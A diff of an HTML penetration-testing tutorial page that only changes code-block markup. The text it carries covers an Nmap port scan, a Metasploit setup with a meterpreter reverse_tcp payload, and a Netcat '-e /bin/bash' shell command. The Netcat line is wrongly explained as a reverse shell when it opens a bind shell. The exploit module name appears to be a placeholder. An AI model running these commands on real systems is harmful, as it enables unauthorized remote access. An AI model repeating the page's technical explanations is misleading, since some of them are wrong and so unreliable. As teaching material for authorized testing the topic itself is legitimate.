@@ -166,9 +166,8 @@
 * Metasploit: a commercial penetration testing framework, priced at $1,995 per year for the pro edition</p>
 <h3 id="example-code-scanning-with-nmap">Example Code: Scanning with Nmap</h3>
 <p>The following example demonstrates how to use Nmap to scan a target system for open ports:</p>
-<div class="codehilite"><pre><span></span><code>nmap<span class="w"> </span>-sS<span class="w"> </span>-p-<span class="w"> </span><span class="m">192</span>.168.1.100
-</code></pre></div>
-
+<pre><code class="language-bash">nmap -sS -p- 192.168.1.100
+</code></pre>
 <p>This command uses the <code>-sS</code> flag to specify a TCP SYN scan, and the <code>-p-</code> flag to scan all ports. The <code>192.168.1.100</code> is the IP address of the target system. The output will show a list of open ports, along with the corresponding services and protocols.</p>
 <h2 id="vulnerability-exploitation">Vulnerability Exploitation</h2>
 <p>Vulnerability exploitation is a critical phase of penetration testing, where the goal is to exploit identified vulnerabilities to gain unauthorized access to the target system. Some common techniques include:
@@ -177,13 +176,12 @@
 * Cross-site scripting (XSS) attacks: injecting malicious JavaScript code to steal user credentials or take control of user sessions</p>
 <h3 id="example-code-exploiting-a-buffer-overflow-vulnerability">Example Code: Exploiting a Buffer Overflow Vulnerability</h3>
 <p>The following example demonstrates how to use Metasploit to exploit a buffer overflow vulnerability in a vulnerable program:</p>
-<div class="codehilite"><pre><span></span><code><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">fileformat</span><span class="o">/</span><span class="n">buffer_overflow</span>
-<span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">windows</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span>
-<span class="n">set</span><span class="w"> </span><span class="n">lhost</span><span class="w"> </span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">1</span><span class="o">.</span><span class="mi">100</span>
-<span class="n">set</span><span class="w"> </span><span class="n">lport</span><span class="w"> </span><span class="mi">4444</span>
-<span class="n">exploit</span>
-</code></pre></div>
-
+<pre><code class="language-ruby">use exploit/windows/fileformat/buffer_overflow
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.100
+set lport 4444
+exploit
+</code></pre>
 <p>This code uses the <code>use</code> command to specify the exploit module, and the <code>set</code> command to configure the payload, local host, and local port. The <code>exploit</code> command is then used to launch the exploit.</p>
 <h2 id="post-exploitation">Post-Exploitation</h2>
 <p>Post-exploitation refers to the activities that occur after a successful exploit, such as maintaining access, escalating privileges, and gathering sensitive data. Some common techniques include:
@@ -192,9 +190,8 @@
 * Gathering sensitive data: extracting sensitive information such as passwords, credit card numbers, or personal identifiable information (PII)</p>
 <h3 id="example-code-creating-a-reverse-shell">Example Code: Creating a Reverse Shell</h3>
 <p>The following example demonstrates how to use Netcat to create a reverse shell connection to a target system:</p>
-<div class="codehilite"><pre><span></span><code>nc<span class="w"> </span>-l<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
-</code></pre></div>
-
+<pre><code class="language-bash">nc -l -p 4444 -e /bin/bash
+</code></pre>
 <p>This command uses the <code>-l</code> flag to specify listen mode, the <code>-p</code> flag to specify the port number, and the <code>-e</code> flag to specify the executable to run. The <code>/bin/bash</code> is the executable to run, which establishes a reverse shell connection to the target system.</p>
 <h2 id="real-world-use-cases">Real-World Use Cases</h2>
 <p>Penetration testing has numerous real-world use cases, including:
